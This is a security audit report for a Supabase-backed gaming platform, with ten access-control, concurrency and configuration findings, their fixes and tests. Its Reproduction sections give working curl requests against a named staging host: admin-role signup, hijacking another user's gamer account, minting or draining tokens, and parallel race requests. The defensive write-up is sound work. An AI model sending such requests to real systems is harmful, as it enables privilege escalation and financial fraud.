# Security Audit Report - Sogverse

**Date:** 2026-03-01
**Target:** sogverse-staging.sog.gg
**Supabase Project:** dbcozhkmfsczwgduizkg.supabase.co

> **Note:** Migration files referenced below (00001–00048) were squashed into 10 domain-organized files in March 2026. All fixes described here are included in the current migrations under `supabase/migrations/`. See `00009_rls_and_grants.sql` for centralized RLS/grant policies.

---

## Executive Summary

| # | Vulnerability | Severity | Exploitability | Category | Status |
|---|---------------|----------|----------------|----------|--------|
| 1 | Admin Account Creation via Metadata | **CRITICAL** | Easy | Broken Access Control | **FIXED** |
| 2 | IDOR: Unauthorized Gamer Linking | **HIGH** | Easy | Broken Access Control | **FIXED** |
| 3 | Cron Race Condition (Double Charge) | **LOW** | Low | Concurrency | Mitigated |
| 4 | Token Balance Race Condition | **HIGH** | Medium | Concurrency | **FIXED** |
| 5 | JSONB DoS via Expensive Casts | **LOW** | Low | Denial of Service | Mitigated |
| 6 | Cron Function Public Access | **MEDIUM** | Easy | Broken Access Control | **FIXED** |
| 7 | Missing Security Headers / Weak CSP | **MEDIUM** | N/A | Configuration | **FIXED** (nonce-based CSP) |
| 8 | GET-Based Signout CSRF | **MEDIUM** | Easy | CSRF | **FIXED** |
| 9 | LIKE Wildcard Injection | **LOW** | Medium | Input Validation | **FIXED** |
| 10 | `adjust_token_balance` Public RPC Access | **CRITICAL** | Easy | Broken Access Control | **FIXED** |

---

## Critical & High Severity Findings

### 1. Admin Account Creation via Metadata Manipulation — FIXED

**Severity:** CRITICAL
**Location:** `supabase/migrations/00001_create_profiles.sql:71-76`
**CWE:** CWE-287 (Improper Authentication)
**Fixed in:** Migration `00042_fix_handle_new_user_role_escalation.sql`, branch `fix/handle-new-user-role-escalation`
**Fixed date:** 2026-03-02

#### Description

The `handle_new_user()` PostgreSQL trigger trusts user-supplied metadata during registration to assign roles. While the frontend UI hardcodes `role: "customer"`, an attacker can call the Supabase Auth API directly with a crafted payload to create admin accounts.

#### Root Cause

```sql
-- Vulnerable code in handle_new_user() trigger
role_from_meta := NULLIF(NEW.raw_user_meta_data->>'role', '');
IF role_from_meta IS NOT NULL AND role_from_meta IN ('admin', 'customer', 'gamer', 'gedu') THEN
  profile_role := role_from_meta::user_role;  -- TRUSTS USER INPUT!
```

#### Reproduction

```bash
# Create admin account via direct API call
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/auth/v1/signup" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Origin: https://sogverse-staging.sog.gg" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "data": {
      "role": "admin",
      "display_name": "Attacker"
    }
  }'
```

#### Impact

- Full admin access to the application
- Ability to create gedu accounts, games, and products
- Access to all user data via admin RLS policies
- Token balance manipulation for any user
- Complete system compromise

#### Fix Applied

The trigger now **unconditionally assigns `customer`** to every new signup, ignoring `raw_user_meta_data->>'role'` entirely. All privileged roles are assigned via server-side promote pattern after user creation:

```sql
-- Migration 00042: handle_new_user() always assigns customer
CREATE OR REPLACE FUNCTION handle_new_user()
RETURNS TRIGGER AS $$
DECLARE
  profile_display_name TEXT;
BEGIN
  profile_display_name := COALESCE(NULLIF(NEW.raw_user_meta_data->>'display_name', ''), 'New User');

  INSERT INTO public.profiles (id, email, role, display_name)
  VALUES (NEW.id, NEW.email, 'customer', profile_display_name);

  INSERT INTO public.customer_profiles (user_id) VALUES (NEW.id);

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public;
```

Role promotion is handled exclusively by server-side API routes using the service role key:

- **Gedu**: `POST /api/admin/create-gedu` (admin-only) — creates user as customer, then promotes to gedu and deletes the `customer_profiles` row.
- **Gamer**: `POST /api/gamers/create` (customer-only) — creates user as customer, then promotes to gamer, swaps extension tables, and links to the creating customer via `parent_gamer`.
- **Admin**: Created manually via Supabase dashboard only. No API route exists.

Additional defense layers:
- RLS policy `users_update_own_profile` has `WITH CHECK (role = get_user_role())` — users cannot change their own role via direct REST API calls.
- The `validate_parent_gamer_roles` trigger enforces that `parent_gamer` links can only reference users with `role = 'gamer'`.
- The `@gamer.sogverse.internal` email domain no longer grants gamer role — it only results in a customer account.

#### Verified attack vectors (all blocked)

1. Signup with `{"data": {"role": "admin"}}` — gets customer
2. Signup with `{"data": {"role": "gedu"}}` — gets customer
3. Signup with `{"data": {"role": "gamer"}}` — gets customer
4. Signup with `@gamer.sogverse.internal` email — gets customer
5. Direct REST API `PATCH /profiles` to change own role — blocked by RLS
6. Direct REST API `INSERT /parent_gamer` to hijack a gamer — separate issue (Finding #2)

#### Test coverage

6 DB integration tests in `tests/db/handle-new-user.test.ts` verify all escalation paths are blocked. CI passes.

---

### 2. IDOR: Unauthorized Gamer Linking — FIXED

**Severity:** HIGH
**Location:** `parent_gamer` table RLS policy
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**Fixed in:** Migration `00044_fix_idor_parent_gamer_linking.sql`
**Fixed date:** 2026-03-02

#### Description

Any authenticated customer can link themselves as a parent to any gamer account, gaining full control over that gamer's enrollments and profile access.

#### Root Cause

The `parent_gamer` INSERT policy only validates `parent_id = auth.uid()`, not whether the user should have access to `gamer_id`.

#### Reproduction

```bash
# 1. Discover target gamer IDs from public enrollments
curl 'https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/group_enrollments?select=gamer_id&limit=10' \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"

# 2. Link yourself to any gamer
curl -X POST 'https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/parent_gamer' \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{
    "parent_id": "YOUR_USER_ID",
    "gamer_id": "VICTIM_GAMER_ID",
    "relationship": "parent"
  }'

# 3. Access victim gamer's profile
curl "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/profiles?id=eq.$VICTIM_GAMER_ID&select=*" \
  -H "Authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"
```

#### Impact

- View victim gamer's full profile
- Enroll/unenroll victim in products
- Spend tokens on victim's enrollments
- Remove victim from their legitimate parent's access

#### Fix Applied

Removed client-side INSERT access to `parent_gamer` entirely. The `customers_create_links` RLS policy was the sole INSERT path for authenticated users and lacked `gamer_id` authorization. All legitimate gamer linking already goes through the server-side `POST /api/gamers/create` route using the service role client (which bypasses RLS).

```sql
-- Migration 00044: remove client-side INSERT access
DROP POLICY IF EXISTS "customers_create_links" ON parent_gamer;
REVOKE INSERT ON parent_gamer FROM authenticated;
```

Dead client-side code (`GamerService.linkGamer()` and `useLinkGamer` hook) was also removed — neither was referenced by any component.

When multi-parent linking is needed in the future, it will be implemented as a server-side API route with proper authorization (e.g., invite codes or existing parent approval).

---

### 3. Cron Function Race Condition (Double Charge) — Mitigated

**Severity:** LOW (downgraded from HIGH after Finding #6 fix)
**Location:** `process_enrollment_charges()` RPC
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)
**Mitigated by:** Migration `00045_revoke_cron_function_public_access.sql` (Finding #6 fix)

#### Description

Race condition in `process_enrollment_charges()` can cause customers to be charged multiple times for a single session while only one charge is recorded, leading to accounting discrepancies and financial harm.

#### Root Cause

```sql
-- process_enrollment_charges() lines 120-140
-- EXISTS check is not atomic with INSERT
-- Tokens are deducted BEFORE the UNIQUE constraint is checked
IF EXISTS (SELECT 1 FROM enrollment_charges WHERE ...) THEN CONTINUE; END IF;
-- Race window here
SELECT ... FROM adjust_token_balance(...);  -- Tokens deducted
INSERT INTO enrollment_charges (...);        -- UNIQUE violation caught here
```

#### Reproduction

```bash
# Trigger 50 parallel requests to the cron function
for i in {1..50}; do
  curl -s -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/process_enrollment_charges" \
    -H "authorization: Bearer $TOKEN" \
    -H "apikey: $ANON_KEY" &
done
wait

# Check for duplicate deductions
curl -s "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/token_transactions?select=*&type=eq.enrollment&order=created_at.desc&limit=20" \
  -H "authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"
```

#### Impact

- Multiple token_transactions records with same enrollment
- Only one corresponding enrollment_charges record
- Customer balance deducted multiple times
- Financial harm and accounting discrepancies

#### Mitigation

With Finding #6 fixed (migration 00045), `process_enrollment_charges()` is no longer callable via the PostgREST API. The only caller is pg_cron, which runs hourly and serially — concurrent invocations cannot occur under normal operation.

The TOCTOU race window still exists in the function logic (EXISTS check at line 120 is not atomic with INSERT at line 139), but it is no longer externally exploitable. The original remediation (reorder to INSERT ... ON CONFLICT before token deduction) would require schema changes to `enrollment_charges.transaction_id` and is not worth the complexity given the eliminated attack surface.

**Original remediation (preserved for reference):**

```sql
-- Use INSERT ... ON CONFLICT to make the check atomic
INSERT INTO enrollment_charges (enrollment_id, amount, transaction_id, session_date)
VALUES (v_rec.enrollment_id, v_rec.token_cost, v_tx_id, v_session_date)
ON CONFLICT (enrollment_id, session_date) DO NOTHING;

IF NOT FOUND THEN
  -- Another process already charged, skip token deduction
  CONTINUE;
END IF;

-- Only deduct tokens AFTER successful insert
SELECT ... FROM adjust_token_balance(...);
```

---

### 4. Token Balance Race Condition — FIXED

**Severity:** HIGH
**Location:** `adjust_token_balance()` RPC
**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)
**Fixed in:** Migration `00043_revoke_adjust_token_balance_public_access.sql`
**Fixed date:** 2026-03-02

#### Description

The `adjust_token_balance` RPC lacks row-level locking, allowing concurrent requests to cause inconsistent balances or overdrafts.

#### Root Cause

```sql
-- No SELECT FOR UPDATE before the UPDATE
UPDATE profiles
SET token_balance = token_balance + p_amount
WHERE id = p_user_id
RETURNING token_balance INTO v_new_balance;
```

#### Reproduction

```bash
# User has 10 tokens, product costs 8 tokens
# Send 3 concurrent enrollment requests - all may succeed

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

curl -X POST "https://sogverse-staging.sog.gg/api/enrollments" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"gamerId":"...","groupId":"..."}' &

wait
# Check balance - may be incorrect or negative
```

#### Impact

- Token balance corruption
- Free enrollments (overdraft)
- Financial loss

#### Remediation

```sql
CREATE OR REPLACE FUNCTION adjust_token_balance(...)
RETURNS TABLE(new_balance INTEGER, transaction_id UUID)
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_new_balance INTEGER;
  v_transaction_id UUID;
BEGIN
  -- Lock the row before updating to prevent race conditions
  SELECT token_balance INTO v_new_balance
  FROM profiles
  WHERE id = p_user_id
  FOR UPDATE;  -- ADD THIS LOCK

  UPDATE profiles
  SET token_balance = token_balance + p_amount
  WHERE id = p_user_id
  RETURNING token_balance INTO v_new_balance;

  INSERT INTO token_transactions (user_id, amount, type, description, stripe_idempotency_key, stripe_subscription_id, currency)
  VALUES (p_user_id, p_amount, p_type, p_description, p_stripe_idempotency_key, p_stripe_subscription_id, p_currency)
  RETURNING id INTO v_transaction_id;

  RETURN QUERY SELECT v_new_balance, v_transaction_id;
END;
$$;
```

#### Fix Applied

Migration `00043_revoke_adjust_token_balance_public_access.sql` adds `SELECT ... FOR UPDATE` row locking before the balance update, serializing concurrent modifications. Combined with the Finding #10 fix (REVOKE public access) in the same migration.

---

### 5. JSONB DoS via Expensive Type Casts — Mitigated

**Severity:** LOW (downgraded from HIGH after migration 00029 admin role check)
**Location:** `commit_group_changes()` RPC
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**Mitigated by:** Migration `00029_restrict_group_rpcs_to_admin.sql`

#### Description

The `commit_group_changes()` RPC accepts JSONB arrays and performs type casts on each element without pre-validation. A small malicious payload with deeply nested or malformed data can trigger expensive error handling and type conversion operations, resulting in high amplification (few requests → significant resource consumption).

#### Root Cause

```sql
-- Direct cast without validation on each array element
(v_move->>'fromGroupId')::UUID  -- Throws on invalid input, expensive for large arrays
(v_move->>'gamerId')::UUID
(v_group->>'geduId')::UUID
```

Each failed cast triggers PostgreSQL's error handling path, which is significantly more expensive than a simple validation check. With large arrays, a single request can consume substantial CPU and memory.

#### Reproduction

```bash
# Single request with large array of invalid UUIDs
# Each element triggers expensive error handling
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/commit_group_changes" \
  -H "authorization: Bearer $ADMIN_TOKEN" \
  -H "apikey: $APIKEY" \
  -H "content-type: application/json" \
  -d '{
    "p_product_id": "not-a-uuid",
    "p_added_groups": [
      {"geduId": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
      {"geduId": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
      {"geduId": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"}
    ],
    "p_enrollment_moves": [
      {"fromGroupId": "x", "gamerId": "y"},
      {"fromGroupId": "x", "gamerId": "y"}
    ]
  }'
```

#### Impact

- High amplification: small request → expensive server-side processing
- Potential denial of service with few requests
- Database connection pool exhaustion
- Affects all users sharing the same database instance

#### Mitigation

With migration 00029, `commit_group_changes()` now requires `get_user_role() = 'admin'` inside the function body. Only admin accounts (created manually via the Supabase dashboard) can call this RPC. The API route (`POST /api/admin/products/[id]/groups`) also enforces `requireRole("admin")` server-side.

The UI builds payloads from discrete user interactions (clicking "add group", dragging gamers) — array sizes are bounded by the number of groups and gamers that exist for a product. Invalid UUIDs and oversized arrays can only be injected via crafted HTTP requests, which now require admin credentials.

The JSONB validation gaps still exist in the function logic, but the attack surface is reduced to a compromised admin account. Normal UI usage cannot trigger the issue.

#### Remediation (preserved for reference)

Add input validation before type casting to fail fast:

```sql
-- Validate UUIDs before expensive casting
CREATE OR REPLACE FUNCTION validate_uuid(p_value TEXT, p_field_name TEXT)
RETURNS UUID
LANGUAGE plpgsql
IMMUTABLE
AS $$
BEGIN
  IF p_value IS NULL THEN
    RETURN NULL;
  END IF;

  IF length(p_value) > 36 OR p_value !~ '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' THEN
    RAISE EXCEPTION 'Invalid % format: expected UUID', p_field_name;
  END IF;

  RETURN p_value::UUID;
END;
$$;

-- Use in commit_group_changes:
v_product_id := validate_uuid(p_product_id, 'product_id');
```

Alternatively, add array length limits:

```sql
-- Limit array sizes to prevent abuse
IF jsonb_array_length(p_added_groups) > 100 THEN
  RAISE EXCEPTION 'Too many groups: maximum 100 allowed';
END IF;

IF jsonb_array_length(p_enrollment_moves) > 1000 THEN
  RAISE EXCEPTION 'Too many moves: maximum 1000 allowed';
END IF;
```

---

### 10. `adjust_token_balance` Public RPC Access (Unlimited Token Minting) — FIXED

**Severity:** CRITICAL
**Location:** `adjust_token_balance()` RPC, migration `00013_token_balance_and_transactions.sql:88`
**CWE:** CWE-284 (Improper Access Control)
**Fixed in:** Migration `00043_revoke_adjust_token_balance_public_access.sql`
**Fixed date:** 2026-03-02

#### Description

The `adjust_token_balance()` RPC is `SECURITY DEFINER` (bypasses RLS) and was granted to `authenticated` in migration 00013. No subsequent migration revokes this grant, and the function contains no `auth.uid()` check. Any authenticated user — customer, gamer, or gedu — can call it directly via `supabase.rpc()` to credit arbitrary token amounts to any user.

This is distinct from Finding #4 (race condition in the same function) and Finding #6 (public access on `process_enrollment_charges`). While Finding #6 leaks metrics, this finding allows **direct financial manipulation**.

#### Root Cause

```sql
-- Migration 00013: grants public access
GRANT EXECUTE ON FUNCTION adjust_token_balance TO authenticated;

-- No REVOKE in any subsequent migration
-- No auth.uid() check inside the function body
-- Function is SECURITY DEFINER — bypasses all RLS
```

Migration 00037 added `auth.uid()` guards to `enroll_gamer_in_group`, `unenroll_gamer`, and `get_customer_enrollments` (since removed — replaced by the customer branch in `get_my_groups`), but `adjust_token_balance` was not included in that hardening pass.

#### Reproduction

```bash
# Any authenticated user can mint unlimited tokens for themselves (or anyone)
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/adjust_token_balance" \
  -H "Authorization: Bearer $ANY_USER_TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "p_user_id": "YOUR_USER_ID",
    "p_amount": 999999,
    "p_type": "purchase",
    "p_description": "Free tokens"
  }'

# Or credit tokens to any other user
curl -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/adjust_token_balance" \
  -H "Authorization: Bearer $ANY_USER_TOKEN" \
  -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "p_user_id": "VICTIM_USER_ID",
    "p_amount": -999999,
    "p_type": "admin_adjustment",
    "p_description": "Drain their balance"
  }'
```

#### Impact

- Any user can give themselves unlimited tokens (complete bypass of Stripe payment flow)
- Any user can drain another user's token balance to zero or negative (constrained only by CHECK constraint)
- Fake transaction records pollute the ledger with arbitrary types and descriptions
- Direct financial loss — tokens have real monetary value via Stripe purchases
- Complete undermining of the token economy

#### Remediation

Revoke the public grant. The function is only called from:
1. Server-side API routes using the admin/service-role client (`auth.uid()` is NULL) — Stripe webhook, admin adjust-tokens
2. Other `SECURITY DEFINER` RPCs (`enroll_gamer_in_group`, `unenroll_gamer`) — these call it internally, not via the PostgREST API

Neither caller needs the `authenticated` grant.

```sql
-- Revoke public access
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM authenticated;
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM anon;
REVOKE EXECUTE ON FUNCTION adjust_token_balance FROM public;
```

#### Fix Applied

Migration `00043_revoke_adjust_token_balance_public_access.sql` revokes `EXECUTE` from `authenticated`, `anon`, and `public`, and also adds `SELECT ... FOR UPDATE` row locking (Finding #4 fix) in a single migration.

DB test `tests/db/token-balance.test.ts` verifies that authenticated users receive a "permission denied" error when calling the RPC directly.

---

## Medium Severity Findings

### 6. Cron Function Public Access — FIXED

**Severity:** MEDIUM
**Location:** `process_enrollment_charges()` RPC
**CWE:** CWE-284 (Improper Access Control)
**Fixed in:** Migration `00045_revoke_cron_function_public_access.sql`
**Fixed date:** 2026-03-04

#### Description

Any authenticated user can trigger the billing cron job, exposing aggregate business metrics (charged count, unenrolled count, error count).

#### Root Cause

PostgreSQL grants EXECUTE on new functions to PUBLIC by default. No explicit REVOKE exists for `process_enrollment_charges()`.

#### Reproduction

```bash
# Any authenticated user can call
curl -s -X POST "https://dbcozhkmfsczwgduizkg.supabase.co/rest/v1/rpc/process_enrollment_charges" \
  -H "authorization: Bearer $TOKEN" \
  -H "apikey: $ANON_KEY"

# Response exposes business metrics:
# {"charged":5,"unenrolled":1,"errors":0,"processed_at":"..."}
```

#### Impact

- Information disclosure (business metrics)
- DoS by triggering cron repeatedly
- Enables exploitation of Finding #3 (race condition) by external callers

#### Fix Applied

Migration `00045_revoke_cron_function_public_access.sql` revokes `EXECUTE` from `authenticated`, `anon`, and `public` on both `process_enrollment_charges()` and `compute_next_session()`. Only pg_cron (running as the function owner) can invoke them.

This also mitigates Finding #3 — with no external callers, the race condition requires concurrent pg_cron executions, which don't occur under normal operation.

---

### 7. Missing Security Headers — FIXED

**Severity:** MEDIUM
**Location:** `next.config.ts`, `src/proxy.ts`
**CWE:** CWE-693 (Protection Mechanism Failure)
**Initially fixed in:** `next.config.ts` `headers()` function (2026-03-04)
**CSP hardened:** Nonce-based CSP in `src/proxy.ts` (2026-03-24)

#### Description

`next.config.ts` had no security headers configured. While Vercel provides some defaults, critical headers were missing:
- `X-Frame-Options` (clickjacking protection)
- `Referrer-Policy` (prevents URL leakage)
- `Content-Security-Policy` (XSS defense-in-depth)

The initial fix added a CSP with `'unsafe-inline'` and `'unsafe-eval'` in `script-src`, which did not protect against most XSS vectors (the primary purpose of CSP).

#### Impact

- Clickjacking: Site can be embedded in iframes for UI deception attacks
- Referrer leakage: Full URLs sent to third parties
- XSS surface: No CSP to limit script execution sources

#### Fix Applied

Five enforced security headers in `next.config.ts`:
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security: max-age=31536000; includeSubDomains`

CSP is set dynamically per-request in `src/proxy.ts` with a **nonce-based `script-src`** in production:
- `script-src 'self' 'nonce-{random}' 'strict-dynamic'` — only scripts tagged by Next.js's SSR pipeline can execute; injected inline scripts are blocked
- `'strict-dynamic'` allows dynamically loaded chunks (Next.js code splitting, Daily.co dynamic import) to execute when loaded by a nonce'd script
- In development, falls back to `'unsafe-inline' 'unsafe-eval'` because Next.js HMR injects scripts outside the SSR pipeline

---

### 8. GET-Based Signout CSRF — FIXED

**Severity:** MEDIUM
**Location:** `src/app/api/auth/signout/route.ts`
**CWE:** CWE-352 (Cross-Site Request Forgery)
**Fixed date:** 2026-03-04

#### Description

The `/api/auth/signout` endpoint uses HTTP GET, which has a side effect (signing out the user). SameSite=Lax cookies allow cookies on top-level GET navigations, enabling forced logout attacks.

#### Impact

- Session disruption (forces logout)
- Annoyance attacks on users
- Could be combined with social engineering

#### Fix Applied

The server-side signout API route was removed entirely. Sign-out now uses the browser Supabase client's `signOut()` method, which calls the Supabase Auth API with the access token in the Authorization header (not cookies) — there is no endpoint to CSRF. Full page navigation via `window.location.href = "/"` wipes all client state.

---

## Low Severity Findings

### 9. LIKE Wildcard Injection in Search — FIXED

**Severity:** LOW
**Location:** `src/services/users/users.service.ts:66`
**CWE:** CWE-1426 (Improper Validation of Syntactic Elements)
**Fixed date:** 2026-03-04

#### Description

Search queries interpolated user input directly into ILIKE patterns without escaping SQL wildcards (`%`, `_`).

#### Impact

- Information disclosure (broad search results)
- Not SQL injection (parameterized queries prevent this)
- Only reachable by admins (admin users page)
- Low business impact

#### Fix Applied

Added `escapeLikePattern()` utility to `src/lib/utils.ts` that escapes `%`, `_`, and `\` before interpolation into ILIKE patterns. Applied to `searchUsers()` in `users.service.ts`.

The `searchProducts()` method in `products.service.ts` was dead code (never called by any component — the admin products page uses client-side filtering) and was removed entirely.

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Risk Reduction | Status |
|----------|---------|--------|----------------|--------|
| **P0** | Admin Account Creation | 1h | Eliminates complete system compromise | **FIXED** |
| **P0** | `adjust_token_balance` Public Access | 15min | Prevents unlimited token minting | **FIXED** |
| **P0** | IDOR Gamer Linking | 2h | Prevents account hijacking | **FIXED** |
| **P1** | Cron Race Condition | 2h | Prevents financial harm | **Mitigated** (via #6 fix) |
| **P1** | Token Balance Race | 1h | Prevents overdrafts | **FIXED** |
| **P1** | JSONB DoS | 2h | Prevents resource exhaustion | **Mitigated** (via admin role check) |
| **P2** | Cron Public Access | 15min | Prevents info disclosure | **FIXED** |
| **P2** | Security Headers | 30min | Defense-in-depth | **FIXED** |
| **P2** | Signout CSRF | 15min | Eliminates forced logout attacks | **FIXED** |
| **P3** | LIKE Wildcard | 30min | Prevents broad searches | **FIXED** |

---

## Testing Verification

After applying fixes, verify:

1. **Admin Account Creation** — **VERIFIED**
   ```bash
   # All of these create customer accounts (verified by CI tests):
   # - Signup with role: "admin" in user_metadata → customer
   # - Signup with role: "gedu" in user_metadata → customer
   # - Signup with role: "gamer" in user_metadata → customer
   # - Signup with @gamer.sogverse.internal email → customer
   # See: tests/db/handle-new-user.test.ts (6 passing tests)
   ```

2. **IDOR Gamer Linking** — **VERIFIED**
   ```bash
   # Authenticated customer INSERT into parent_gamer now returns "permission denied"
   # All linking goes through server-side /api/gamers/create (service role client)
   curl -X POST ".../rest/v1/parent_gamer" -d '{"parent_id":"...","gamer_id":"..."}'
   # Returns: 403 permission denied for table parent_gamer
   ```

3. **Cron Race Condition**
   ```bash
   # Parallel requests should not cause duplicate charges
   for i in {1..10}; do curl -X POST ".../rpc/process_enrollment_charges" & done; wait
   # Check token_transactions for duplicates
   ```

4. **Signout CSRF**
   ```bash
   curl https://your-domain.com/api/auth/signout
   # Should return 405 Method Not Allowed
   curl -X POST https://your-domain.com/api/auth/signout
   # Should successfully log out
   ```

5. **Security Headers**
   ```bash
   curl -I https://your-domain.com
   # Verify X-Frame-Options, Content-Security-Policy present
   ```

6. **Online Scanner**
   - Use https://securityheaders.com to verify headers

---

## Remediation Summary

**Remediation period:** 2026-03-02 to 2026-03-04

### Final status

- **9 of 10 findings fully fixed** (migrations 00042–00045, code changes to `next.config.ts`, `signout/route.ts`, `users.service.ts`)
- **2 mitigated** (#3 cron race condition — no external callers remain; #5 JSONB DoS — admin role check blocks unauthenticated access)
- **All findings resolved** — CSP promoted to enforcing `Content-Security-Policy` (Finding #7)

### Structural defenses added during remediation

These go beyond individual fixes to prevent future classes of the same vulnerabilities:

1. **Automated access control test** (`tests/db/access-control.test.ts`) — queries PostgreSQL catalogs on every CI run. Fails if any non-allowlisted function is callable by `authenticated`/`anon`, or if any table lacks RLS. New functions and tables are caught automatically.
2. **CLAUDE.md rules** — codified the recurring patterns (SECURITY DEFINER access control, RLS IDOR prevention, SELECT FOR UPDATE for financial data) so they are enforced during AI-assisted development.
3. **Private-by-default convention** — all new PostgreSQL functions get `REVOKE EXECUTE` from `authenticated`, `anon`, and `public` unless explicitly allowlisted.

### If reopening this audit

- Run `npm run test:db` — the access control tests will catch any regressions in function grants or missing RLS.
- Review any migrations added after `00010_access_control_helpers` for new SECURITY DEFINER functions or tables without RLS.
- Run https://securityheaders.com against the production domain to verify headers are served correctly.

---

## Appendix: Credential Reference

| Item | Value |
|------|-------|
| Website | https://sogverse-staging.sog.gg |
| Supabase API | https://dbcozhkmfsczwgduizkg.supabase.co |
| Anon Key | `sb_publishable_uO_aAg7bRDNOLnOBA8L4rg_3XSA2vDx` |

*Note: The anon key is public (embedded in frontend) and listed here for documentation purposes.*
